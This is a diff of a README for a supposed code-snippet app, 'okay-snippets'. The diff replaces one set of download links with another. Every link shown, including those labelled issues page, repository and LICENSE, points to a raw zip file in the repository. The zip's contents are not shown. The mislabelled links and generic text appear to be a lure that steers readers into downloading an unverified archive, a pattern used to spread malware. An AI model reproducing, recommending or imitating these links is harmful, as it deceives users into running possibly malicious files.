@@ -1,6 +1,6 @@
 # 🎉 okay-snippets - Essential Code Snippets for Everyone
 
-[![Download okay-snippets](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip%20okay--snippets-v1.0-brightgreen)](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip)
+[![Download okay-snippets](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip%20okay--snippets-v1.0-brightgreen)](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip)
 
 ## 📥 Overview
 
@@ -20,7 +20,7 @@ To get started with okay-snippets, follow these steps to download and run the ap
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our releases page to download the application: [Download okay-snippets](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip).
+   Go to our releases page to download the application: [Download okay-snippets](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip).
 
 2. **Choose the Latest Version**  
    On the releases page, look for the most recent version of okay-snippets. You will see downloadable files for different operating systems.
@@ -61,14 +61,14 @@ If you encounter issues while downloading or running okay-snippets, consider the
 2. **Compatibility Issues:** Verify that your operating system meets the system requirements.
 3. **Installation Errors:** Restart your computer and try reinstalling the application.
 
-If issues persist, please visit our [issues page](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip) for more assistance.
+If issues persist, please visit our [issues page](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip) for more assistance.
 
 ## 🌟 Community and Support
 
 Join our community for updates on new snippets and features. Your experiences and ideas are valuable to us. 
 
-- **GitHub Repository:** [okay-snippets](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip)
-- **Issues Page:** [Report Issues](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip) 
+- **GitHub Repository:** [okay-snippets](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip)
+- **Issues Page:** [Report Issues](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip) 
 
 We welcome any feedback or questions you may have!
 
@@ -78,6 +78,6 @@ This project relies on contributions from many developers and enthusiasts. Thank
 
 ## 🎟️ License
 
-okay-snippets is open source and available under the MIT License. You are free to use and modify the code snippets as you wish. Please check the [LICENSE](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip) file for more information.
+okay-snippets is open source and available under the MIT License. You are free to use and modify the code snippets as you wish. Please check the [LICENSE](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip) file for more information.
 
-Visit our releases page to download the latest version and start using okay-snippets today: [Download okay-snippets](https://raw.githubusercontent.com/AstralVelocity/okay-snippets/main/react/okay-snippets_1.0.zip).
+Visit our releases page to download the latest version and start using okay-snippets today: [Download okay-snippets](https://github.com/AstralVelocity/okay-snippets/raw/refs/heads/main/vue/okay_snippets_1.3.zip).
